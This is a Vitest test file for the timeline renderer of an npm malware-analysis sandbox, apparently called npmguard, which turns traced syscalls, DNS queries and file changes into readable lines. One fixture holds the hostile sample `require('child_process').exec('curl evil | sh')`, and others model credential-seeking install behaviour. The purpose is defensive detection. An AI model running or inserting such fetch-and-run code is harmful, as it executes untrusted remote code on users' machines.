import { describe, it, expect } from "vitest";
import type { Event, RunArtifact } from "@npmguard/shared";
import { renderTimeline } from "./timeline.js";

function artifact(events: Event[], overrides: Partial<RunArtifact> = {}): RunArtifact {
  return {
    runId: "run_test",
    triggerUsed: { kind: "entrypoint", target: "index.js", argv: [], stdin: null },
    setupApplied: {
      env: { HOME: "/home/node" },
      date: null,
      plantFiles: [],
      stubUrls: [],
      hostname: null,
      locale: null,
      patches: [],
      preloadHash: null,
    },
    observe: { kernel: true, network: true, fsDiff: true, node: true, inspector: false },
    budget: { wallMs: 15000, maxSyscalls: null, maxBytesCapture: null },
    wallMs: 500,
    exitCode: 0,
    timedOut: false,
    events,
    stdoutHash: null,
    stderrHash: null,
    fsDiffHash: null,
    pcapHash: null,
    straceLogHash: null,
    inspectorLogHash: null,
    eventSummary: { uniqueHosts: [], uniqueSyscalls: [], filesWritten: [], dnsQueries: [] },
    error: null,
    contentHash: "abc",
    createdAt: "2026-07-08T00:00:00.000Z",
    ...overrides,
  };
}

function ev(overrides: Partial<Event>): Event {
  return {
    stream: "L1:seccomp",
    timestamp: 0,
    pid: 1,
    kind: "openat",
    raw: null,
    ...overrides,
  };
}

/** The rendered line for a given event id, e.g. "e3". */
function lineFor(text: string, id: string): string {
  return text.split("\n").find((l) => l.startsWith(id + " ")) ?? "";
}

describe("renderTimeline — fd resolution", () => {
  it("(1) write to an fd previously openat'd to a file reads `write <path>`", () => {
    const { text } = renderTimeline(
      artifact([
        ev({ kind: "openat", timestamp: 1000, raw: 'openat(AT_FDCWD, "/home/node/.npmrc", O_RDONLY) = 5', normalized: { path: "/home/node/.npmrc", ret: "5" } }),
        ev({ kind: "write", timestamp: 2000, raw: 'write(5, "//registry…", 64) = 64', normalized: { fd: 5, ret: "64" } }),
      ]),
    );
    expect(lineFor(text, "e2")).toContain("write");
    expect(lineFor(text, "e2")).toContain("~/.npmrc");
  });

  it("(2) write to fd 1 reads `write stdout` — the 8af78a7 false-positive, fixed by rendering", () => {
    const { text } = renderTimeline(
      artifact([
        ev({ kind: "write", timestamp: 1000, raw: 'write(1, "__NPMGUARD_TRACE__[…]", 4096) = 4096', normalized: { fd: 1, ret: "4096" } }),
      ]),
    );
    expect(lineFor(text, "e1")).toContain("write    stdout");
    expect(lineFor(text, "e1")).not.toContain("fd:1");
  });

  it("(3) write/sendto on an fd previously connect'd shows the socket, not a path", () => {
    const { text } = renderTimeline(
      artifact([
        ev({ kind: "connect", timestamp: 1000, raw: 'connect(7, {sa_family=AF_INET, sin_port=htons(443), sin_addr="45.79.12.8"}, 16) = 0', normalized: { addr: "45.79.12.8", port: 443, ret: "0" } }),
        ev({ kind: "sendto", timestamp: 2000, raw: 'sendto(7, "GET / HTTP/1.1", 14, 0, NULL, 0) = 14', normalized: { addr: null, port: null, ret: "14" } }),
        ev({ kind: "write", timestamp: 3000, raw: 'write(7, "more", 4) = 4', normalized: { fd: 7, ret: "4" } }),
      ]),
    );
    expect(lineFor(text, "e1")).toContain("connect  45.79.12.8:443");
    expect(lineFor(text, "e2")).toContain("45.79.12.8:443"); // sendto resolves via bound fd
    expect(lineFor(text, "e3")).toContain("45.79.12.8:443"); // write too
    expect(lineFor(text, "e3")).not.toMatch(/\.npmrc|\/home/);
  });

  it("a connect on a recycled fd rebinds it — no stale file path leaks onto the socket", () => {
    const { text } = renderTimeline(
      artifact([
        // A file is opened on fd 8, then (after close, untraced) fd 8 is reused
        // for a socket the resolver connects on. The connect must not render the file.
        ev({ kind: "openat", timestamp: 1000, raw: 'openat(AT_FDCWD, "/etc/resolv.conf", O_RDONLY) = 8', normalized: { path: "/etc/resolv.conf", ret: "8" } }),
        ev({ kind: "connect", timestamp: 2000, raw: "connect(8, {sa_family=AF_NETLINK, …}, 12) = 0", normalized: { addr: null, port: null, ret: "0" } }),
        ev({ kind: "sendto", timestamp: 3000, raw: 'sendto(8, "\\x00", 20, 0, NULL, 0) = 20', normalized: { addr: null, port: null, ret: "20" } }),
      ]),
    );
    expect(lineFor(text, "e2")).toContain("connect  socket");
    expect(lineFor(text, "e2")).not.toContain("resolv.conf");
    expect(lineFor(text, "e3")).not.toContain("resolv.conf"); // send after connect resolves to the socket
  });

  it("(5) an unresolved fd renders as `fd:N` and is never dropped", () => {
    const { text, ids } = renderTimeline(
      artifact([
        ev({ kind: "write", timestamp: 1000, raw: 'write(9, "x", 1) = 1', normalized: { fd: 9, ret: "1" } }),
      ]),
    );
    expect(lineFor(text, "e1")).toContain("fd:9");
    expect(ids.has("e1")).toBe(true);
  });
});

describe("renderTimeline — merged order + ids", () => {
  it("(4) L4 lists as a logical block; L1/L2/L3 interleave by wall-clock; ids stay contiguous e1..eN", () => {
    const events: Event[] = [
      ev({ stream: "L4:monkey", kind: "require", timestamp: 0, normalized: { module: "child_process", from: "postinstall.js" } }),
      ev({ stream: "L1:seccomp", kind: "execve", timestamp: 60_000_000, raw: 'execve("/usr/bin/node", ["node","postinstall.js"], …) = 0', normalized: { path: "/usr/bin/node", argv: ["node", "postinstall.js"], ret: "0" } }),
      ev({ stream: "L2:pcap", kind: "dns_query", timestamp: 400_000_000, normalized: { dns: "api.telemetry-stats.example" }, raw: { host: "api.telemetry-stats.example" } }),
      ev({ stream: "L3:fsDiff", kind: "file_created", timestamp: 510_000_000, raw: "A /home/node/.config/svc.json", normalized: { path: "/home/node/.config/svc.json", size: 12 } }),
    ];
    // Feed them out of order to prove the renderer partitions + sorts.
    const { text, ids } = renderTimeline(artifact([events[3]!, events[1]!, events[0]!, events[2]!]));
    const idLines = text.split("\n").filter((l) => /^e\d+ /.test(l));
    expect(idLines.map((l) => l.split(" ")[0])).toEqual(["e1", "e2", "e3", "e4"]);
    expect(ids).toEqual(new Set(["e1", "e2", "e3", "e4"]));

    // e1 is the L4 event, listed first in the node block — no per-line tag, no t+.
    expect(text).toContain("── [L4] node calls");
    expect(lineFor(text, "e1")).toContain("require");
    expect(lineFor(text, "e1")).not.toMatch(/t\+|\[L\d\]/);

    // wall-clock block: L1/L2/L3 tagged, in non-decreasing t+ order.
    expect(lineFor(text, "e2")).toContain("[L1]");
    expect(lineFor(text, "e3")).toContain("[L2]");
    expect(lineFor(text, "e4")).toContain("[L3]");
    const ts = ["e2", "e3", "e4"].map((id) => Number(lineFor(text, id).match(/t\+([\d.]+)s/)?.[1]));
    for (let i = 1; i < ts.length; i++) expect(ts[i]!).toBeGreaterThanOrEqual(ts[i - 1]!);
  });

  it("collapses back-to-back identical calls into one line with [xN] and a timespan", () => {
    const { text, ids } = renderTimeline(
      artifact([
        ev({ kind: "read", timestamp: 100_000_000, raw: 'read(5, "..", 64) = 64', normalized: { fd: 5, ret: "64" } }),
        ev({ kind: "read", timestamp: 150_000_000, raw: 'read(5, "..", 64) = 64', normalized: { fd: 5, ret: "64" } }),
        ev({ kind: "read", timestamp: 200_000_000, raw: 'read(5, "..", 64) = 64', normalized: { fd: 5, ret: "64" } }),
        ev({ kind: "openat", timestamp: 250_000_000, raw: 'openat(AT_FDCWD, "/x", O_RDONLY) = 9', normalized: { path: "/x", ret: "9" } }),
      ]),
    );
    const readLine = text.split("\n").find((l) => l.includes("read"))!;
    expect(readLine).toContain("[x3]");
    expect(readLine).toContain("t+0.10-0.20s"); // span across the three, not a single stamp
    // three reads + one open → two emitted rows, two ids
    expect(ids.size).toBe(2);
    expect(text.split("\n").filter((l) => /^e\d+ /.test(l))).toHaveLength(2);
  });

  it("does not collapse non-adjacent or differing calls", () => {
    const { text } = renderTimeline(
      artifact([
        ev({ kind: "read", timestamp: 100_000_000, raw: "read(5) = 1", normalized: { fd: 5, ret: "1" } }),
        ev({ kind: "write", timestamp: 110_000_000, raw: "write(5) = 1", normalized: { fd: 5, ret: "1" } }),
        ev({ kind: "read", timestamp: 120_000_000, raw: "read(5) = 1", normalized: { fd: 5, ret: "1" } }),
      ]),
    );
    expect(text.split("\n").filter((l) => /^e\d+ /.test(l))).toHaveLength(3); // read, write, read — no merge
    expect(text).not.toContain("[x");
  });

  it("renders a script_parsed event as decoded source + a dynamically-compiled marker", () => {
    const source = "require('child_process')\n  .exec('curl evil | sh')";
    const { text } = renderTimeline(
      artifact([
        ev({ stream: "L4:v8inspector", kind: "script_parsed", timestamp: 0, normalized: { url: "evalmachine.<anonymous>", source, len: source.length } }),
      ]),
    );
    const line = lineFor(text, "e1");
    expect(line).toContain("require('child_process') .exec('curl evil | sh')"); // flattened source, not the url
    expect(line).not.toContain("evalmachine"); // the meaningless url is not shown
    expect(line).toContain(`[dynamically compiled · ${source.length}c]`); // explicit invariant + true length, not capped
    expect(text).toContain("── [L4] node calls"); // lands in the L4 block, no wall-clock
  });

  it("marks a script whose captured source was capped (a large decoded blob is itself notable)", () => {
    const { text } = renderTimeline(
      artifact([
        ev({ stream: "L4:v8inspector", kind: "script_parsed", timestamp: 0, normalized: { url: "", source: "x".repeat(8192), len: 45210 } }),
      ]),
    );
    expect(lineFor(text, "e1")).toContain("[dynamically compiled · 45210c · capped]");
  });

  it("renders a header with trigger + setup and an empty-events fallback", () => {
    const { text } = renderTimeline(
      artifact([], {
        triggerUsed: { kind: "lifecycle", target: "postinstall", argv: [], stdin: null },
        setupApplied: {
          env: { NPM_TOKEN: "x", HOME: "/home/node" },
          date: null,
          plantFiles: [{ path: "/home/node/.npmrc", contentHash: "h" }],
          stubUrls: [],
          hostname: null,
          locale: null,
          patches: [],
          preloadHash: null,
        },
      }),
    );
    expect(text).toContain("trigger=lifecycle:postinstall");
    expect(text).toContain("env NPM_TOKEN, HOME");
    expect(text).toContain("planted ~/.npmrc");
    expect(text).toContain("(no events captured)");
  });
});
